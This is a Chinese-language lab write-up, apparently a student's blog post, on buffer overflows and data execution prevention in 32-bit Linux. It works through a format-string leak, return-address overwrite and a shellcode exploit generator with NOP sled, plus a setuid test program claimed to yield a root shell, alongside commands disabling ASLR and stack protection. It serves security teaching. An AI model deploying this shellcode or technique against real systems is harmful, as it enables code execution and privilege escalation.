---
layout: post
title: "OS Security Lab—缓冲区溢出与数据执行保护DEP"
subtitle: "[OS Security Lab] Buffer Overflow and Data Execution Prevention (DEP)"
author: "PYQ"
header-mask: 0.3
mathjax: true
catalog: true
tags:
  - os security
---

## 攻击原理

### C程序运行时结构

通过一个简单的C程序来叙述C程序运行时内存结构：

> 以32位进行讲解（即使用的寄存器为eip—指向将要被执行的下一条指令；ebp—当前栈帧的栈底；esp—当前栈帧的栈顶）
>
> 内存实际发生的情况远比例图复杂，省略了很多东西，例如堆，系统代码，动态链接库等

```c
int fun(int a, int b);
int m = 10;
int main(){
    int i = 4;
    int j = 5;
    m = fun(i, j);
    return 0;
}
int fun(int a, int b){
    int c = 0;
    c = a + b;
    return c;
}
```

初始运行时状态结构如下：

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304130919589.png">

main函数调用fun函数前的栈帧结构如下：

- ebp的位置相对于初始状态发生改变，始终指向当前栈帧的栈底；ebp的上一个元素为保存的上一个栈帧的栈底即ebp值，这是为了在函数结束后通过出栈赋值给ebp，从而回到上一个栈帧栈底
- esp指向fun函数执行后的返回地址，此时eip从main函数跳转到fun函数地址，当fun函数执行完毕后，需要返回main函数调用fun函数的下一行进行执行，这个地址被保存在当前的esp中

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304130925902.png">

fun函数调用完成时（未开始恢复上一个栈帧）的程序运行时结构：

- 可以看到ebp上方依旧为保存的上一个栈帧的栈底

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304130938238.png">

fun函数完全退出（恢复main函数栈帧）的程序运行时结构：

- 可以看到ebp由于之前的保存值，通过出栈给ebp进行恢复至main函数栈帧的栈底
- eip由于fun函数执行后的返回地址的保存，恢复至main函数中调用fun函数的下一行指令

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304130941338.png">

main函数退出步骤同fun函数，此处不再赘述。可以看到每一个栈帧调用完毕时，eip会恢复至保存的下一行即将执行的指令地址，如果我们对栈帧进行覆盖，修改为我们规定好的地址例如能发起攻击的shellcode代码，使得栈在退出时直接跳转至预设好的攻击代码，即可成功发起攻击，这也是缓冲区溢出攻击的主要原理。

### 数据执行保护DEP

DEP（Data Execution Prevention，数据执行保护）是一种安全机制，旨在防止恶意软件对系统内存的攻击。它可以在操作系统层面上，**限制关键的内存区域只能执行代码而不能执行数据，从而阻止那些试图利用缓冲区溢出等漏洞将恶意代码注入到内存并让其被执行的攻击**。

DEP机制主要有两种工作模式：

1. 硬件 DEP：这种 DEP 实现依靠 CPU 特性，可以防止某些汇编指令写入和执行位于内存中的地址空间。例如，数据只能被加载和存储指令所操作，而不能被执行。

2. 软件 DEP：这种 DEP 实现方法则涉及修改操作系统内核，使得特定的内存页不能被执行，只允许请求了“可执行”标记（可执行权限）的程序访问这些页面。另外，在 Windows 操作系统中，软件 DEP 还允许管理员或用户配置选择程序或进程。我们可以选择“允许执行以下程序”或者“除允许执行以下程序外，所有程序都不允许执行”。

本实验使用的3种DEP机制：

1. 地址空间布局随机化 (Address Space Layout Randomization, ASLR)：

   0：没有随机化。即关闭 ASLR。
   1：保留的随机化。共享库、栈、mmap() 以及 VDSO 将被随机化。
   2：默认值，完全的随机化。在 1 的基础上，通过 brk() 分配的内存空间也将被随机化。

```shell
sudo sysctl -w kernel.randomize_va_space = 0
# or root
echo 0 > /proc/sys/kernel/randomize_va_space
```

2. 栈保护机制

```shell
# 关闭栈保护机制
gcc -fno-stack-protector xxx
```

3. 栈不可执行

```shell
# 栈可执行
gcc -z execstack
# 栈不可执行
gcc -z noexecstack
```

## 实验环境

本次实验环境如下：

- OS: Ubuntu 20.04.5 LTS on Windows 10 
- Kernel: 5.10.16.3-microsoft-standard-WSL2
- Arch: x86_64
- Shell: zsh 5.8
- GCC: 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)
- GDB: 9.2 (Ubuntu 9.2-0ubuntu1~20.04.1) 
- 32位库：gcc-multilib

**除格式化字符串溢出实验外，均在32位环境下进行编译运行**。

## 格式化字符串溢出

格式化字符串漏洞是一种常见的安全问题，它通常发生在 C 程序中，并且非常可能被利用为攻击程序提供远程 Shell 或其他控制。下面是一个简单的C程序示例，其中包含格式化字符串漏洞：
```c
// format_overflow.c

#include <stdio.h>

int main() {
    char buf[100];
    printf("Please input your name :)：\n");
    scanf("%s",buf);
    printf("Welcome，%s!\n",buf);
    printf(buf);
    return 0;
}
```

上述程序中，scanf函数将用户从键盘读入的输入存储在一个缓冲区 buf中，接着通过 printf函数在标准输出中打印出名称，最后通过printf函数再次输出输入内容。然而printf(buf)缺少任何参数，printf将会去栈中寻找解释这些格式说明符所需的值，它的参数将直接来自输入。由于 %s 和任何其他转换说明符都会把它们之后的任意可变数量的参数解释成对应数据类型的值，它可以被用于读取或写入需要使用格式字符串作为参数传递的任意内存位置，这就导致了格式化字符串漏洞。

运行程序：

```shell
 gcc -o format_overflow format_overflow.c
 ./format_overflow
```

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304122357592.png">

可以看到程序将不止输出用户输入的内容，还会按照 `%08x` 的每个参数顺序逐个输出栈上的值。攻击者可以使用这种技术来泄露程序中的敏感信息，包括带密钥的加密函数、地址等。

| ASLR | 栈保护机制 | 栈可执行 | 栈不可执行 | 攻击是否成功 |
| ---- | ---------- | -------- | ---------- | ------------ |
| 否   | 是         | 否       | 是         | 是           |
| 否   | 否         | 否       | 是         | 是           |
| 是   | 是         | 否       | 是         | 是           |

## 栈溢出攻击

栈溢出示例程序如下：

```c
  1 // buf.c
  2
  3 #include <stdio.h>
  4 #include <string.h>
  5 char buffer[] = "01234567890123456789========ABCD";
  6 void fun1(){printf("You are attacked!\n");}
  7 void fun(){
  8    char buff[16];
  9    strcpy (buff, buffer);
 10 }
 11
 12 int main(){
 13    fun();
 14    return 0;
 15 }
```

攻击原理：上述程序中buffer数组大小为32字节，而buff数组大小为16字节。由于strcpy函数在进行复制时不进行检查，在复制过程会对buff数组邻界区域进行覆盖（这里为buff数组上方的高地址内存）。通过对C程序运行时结构的了解，在32位环境下fun函数的返回地址恰好被ABCD覆盖，如果我们此时将ABCD修改为fun1函数的地址即可成功跳转从而攻击成功。

关闭地址随机化功能，运行代码并使用后gdb进行调试确定地址：

```shell
sudo sysctl -w kernel.randomize_va_space=0
gcc -Wall -g -o buf buf.c -fno-stack-protector -z execstack -m32
gdb buf -q
```

使用`disas fun`查看fun函数汇编代码，可以看到fun函数在偏移量为50的地方进行返回，我们在这个位置设置断点。

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131018251.png">

在断点出开始执行，先打印出当前esp指向的位置，为0x44434241（恰好为ABCD），再执行下一步，可以看到随即提示段错误，并打印报错信息找不到地址0x44434241。

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131021436.png">

查看fun1函数的汇编代码，可以看到首地址为0x565561ed。

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131024079.png">

将buffer字符串中的ABCD修改为fun1函数的首地址，即可发起攻击。

```c
char buffer[] = "01234567890123456789========\xed\x61\x55\x56";
```

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131026659.png">

| ASLR | 栈保护机制 | 栈可执行 | 栈不可执行 | 攻击是否成功 |
| ---- | ---------- | -------- | ---------- | ------------ |
| 否   | 否         | 是       | 否         | 是           |
| 否   | 否         | 否       | 是         | 否           |
| 是   | 是         | 否       | 是         | 否           |

## 利用缓冲区溢出开启shellcode

示例代码如下：

```c
/* exploit.c */
/* A program that creates a file containing code for launching shell*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] = "\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */

    strcpy(buffer+0x18,"\xfb\xce\xff\xff");
    strcpy(buffer + 100, shellcode);   //将shellcode拷贝至buffer，偏移量设为了 100

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
```

上述代码是利用缓冲区溢出漏洞实现的攻击程序，目的是生成一个恶意代码文件 "badfile"，利用strcpy缓冲区漏洞，让用户在读取文件时跳转至预设的shellcode。

```c
// satck.c

#include <stdio.h>
#include <string.h>

int bof(char *str){
    char buffer[12];
    strcpy(buffer, str);
    return 1;
}

int main(){
    char str[517];
    FILE *badfile;
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

首先需要确定的是攻击地址，取消地址随机化并调试stack文件。

```shell
sudo sysctl -w kernel.randomize_va_space=0
gcc -Wall -g -o stack stack.c -fno-stack-protector -z execstack -m32
gdb stack -q
```

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131109729.png">

可以看出stack.c中str字符数组的地址是0xffffce97，由于strcpy的复制，使得exploit.c中buffer数组内容的地址也是0xffffce97。在exploit.c中，将shellcode的内容放在距buffer偏移量为100的地方，所以可知内存中存储shellcode的地址为0xffffce97+0x64(100)=0xffffcefb。

查看bof函数的汇编代码，确定返回地址。

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131114431.png">

从上图中看到lea -0x14(%ebp), %edx，可知buffer存储在ebp-0x14的位置，即buffer距ebp的距离为0x14，根据栈帧分析可知return address位置为0x14+4（十进制）=0x18。

关键代码：

```c
strcpy(buffer+0x18,"\xfb\xce\xff\xff");
```

运行代码即可发起攻击。

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131132904.png">

> 为stack程序设置setuid和修改文件所有者为root依旧不能获得root权限（已修改/bin/sh—>zsh），多次尝试后放弃。

| ASLR | 栈保护机制 | 栈可执行 | 栈不可执行 | 攻击是否成功 |
| ---- | ---------- | -------- | ---------- | ------------ |
| 否   | 否         | 否       | 是         | 是           |
| 否   | 否         | 否       | 是         | 否           |
| 是   | 是         | 否       | 是         | 否           |

**下述shellcode在设置setuid和修改文件所有者为root后可以成功获得root权限**

```c
 //shellcode_test.c
  2
  3 #include <stdio.h>
  4 #include <string.h>
  5
  6 int main(){
  7         char shellcode[] = "\x6a\x17\x58\x31\xdb\xcd\x80"
  8 "\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";
  9
 10         void (*fp)(void);
 11         fp = (void*)shellcode;
 12         fp();
 13
 14         return 0;
 15 }
```

编译执行。

```shell
gcc -Wall -g -o shellcode_test shellcode_test.c -z execstack -fno-stack-protector -m32
sudo chown root shellcode_test
sudo chmod u+s shellcode_test
```

<img src="https://cdn.jsdelivr.net/gh/peng-yq/Gallery/img/202304131139801.png">

## 参考资料

[1] [【Linux】GDB 入门笔记](https://imageslr.com/2023/gdb.html)

[2] [【干货分享】手把手简易实现SHELLCODE及详解](http://blog.nsfocus.net/easy-implement-shellcode-xiangjie/)

[3] [实验七-缓冲区溢出](https://www.cnblogs.com/jijunyao/p/16977168.html)

[4] [缓冲区溢出与数据执行保护DEP](https://zhuanlan.zhihu.com/p/500221354)

[5] [Buffer Overflow Linux, GDB CYBERPUNK](https://www.cyberpunk.rs/buffer-overflow-linux-gdb)
